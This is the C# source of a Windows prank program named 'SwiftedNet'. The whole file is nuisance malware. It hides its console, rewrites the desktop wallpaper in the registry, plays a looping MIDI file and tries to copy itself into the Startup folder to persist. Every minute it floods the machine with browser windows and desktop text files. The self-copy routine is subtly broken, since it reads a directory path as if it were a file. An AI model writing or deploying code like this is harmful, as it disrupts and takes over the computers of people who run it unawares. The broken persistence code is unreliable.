using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

using Microsoft.Win32;

namespace SwiftedNet
{
    class Program
    {
        private const string url = "https://www.taylorswift.com";
        private const int MIN_BROWSERS = 1;
        private const int MAX_BROWSERS = 20;

        private const int MIN_TEXTFILES = 5;
        private const int MAX_TEXTFILES = 50;

        private const int DELAY_MINUTES = 1;

        private const string RESOURCE_NAME = "bg.jpg";

        private const string MIDI_RESOURCE_NAME = "bg.mid";

        [DllImport("kernel32.dll")]
        static extern bool FreeConsole();

        const int SPI_SETDESKWALLPAPER = 20;
        const int SPIF_UPDATEINIFILE = 0x01;
        const int SPIF_SENDWININICHANGE = 0x02;

        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        [DllImport("winmm.dll", CharSet = CharSet.Unicode)]
        static extern Int32 mciSendString(String command, StringBuilder buffer, Int32 bufferSize, IntPtr hwndCallback);

        public static void PlayMidi(string fileName)
        {
            try
            {
                mciSendString("open " + fileName + " type sequencer alias song", new StringBuilder(), 0, new IntPtr());
                mciSendString("play song", new StringBuilder(), 0, new IntPtr());
            }
            catch (Exception)
            {
                // Failed to play song
            }
        }

        private static void OpenBrowser(string url)
        {
            var psi = new ProcessStartInfo
            {
                FileName = url,
                UseShellExecute = true
            };

            Process.Start(psi);
        }

        private static void CopySelfTo(string path)
        {
            try
            {
                var fileBytes = File.ReadAllBytes(AppContext.BaseDirectory);

                File.WriteAllBytes(path, fileBytes);
            }
            catch (Exception)
            {
                // Wasn't run as admin
            }
        }

        private static void ExtractResource(string resourceName, string fileName)
        {
            var assembly = Assembly.GetExecutingAssembly();

            using (var resource = assembly.GetManifestResourceStream($"{assembly.GetName().Name}.{resourceName}"))
            {
                using (var file = new FileStream(fileName, FileMode.Create, FileAccess.Write))
                {
                    resource?.CopyTo(file);
                }
            }
        }

        private static void ChangeBackground(string resource)
        {
            var key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);

            if (key == null)
            {
                return;
            }

            key.SetValue(@"WallpaperStyle", 2.ToString());
            key.SetValue(@"TileWallpaper", 0.ToString());

            ExtractResource(resource, resource);
            
            SystemParametersInfo(SPI_SETDESKWALLPAPER,
                0,
                Path.Combine(AppContext.BaseDirectory, resource),
                SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }

        static void Main(string[] args)
        {
            FreeConsole();

            ExtractResource(MIDI_RESOURCE_NAME, MIDI_RESOURCE_NAME);

            ChangeBackground(RESOURCE_NAME);

            CopySelfTo(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
            
            var rand = new Random(DateTime.Now.Day);

            while (true)
            {
                PlayMidi(MIDI_RESOURCE_NAME);

                var numInstances = rand.Next(MIN_BROWSERS, MAX_BROWSERS);

                for (var x = 0; x < numInstances; x++)
                {
                    OpenBrowser(url);
                }

                numInstances = rand.Next(MIN_TEXTFILES, MAX_TEXTFILES);

                for (var x = 0; x < numInstances; x++)
                {
                    var textFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), $"ShakeItOff_{DateTime.Now.Ticks}.txt");

                    File.WriteAllText(textFile, $"Look what you made me do on {DateTime.Now}");

                    OpenBrowser(textFile);
                }

                Thread.Sleep(TimeSpan.FromMinutes(DELAY_MINUTES));
            }
        }
    }
}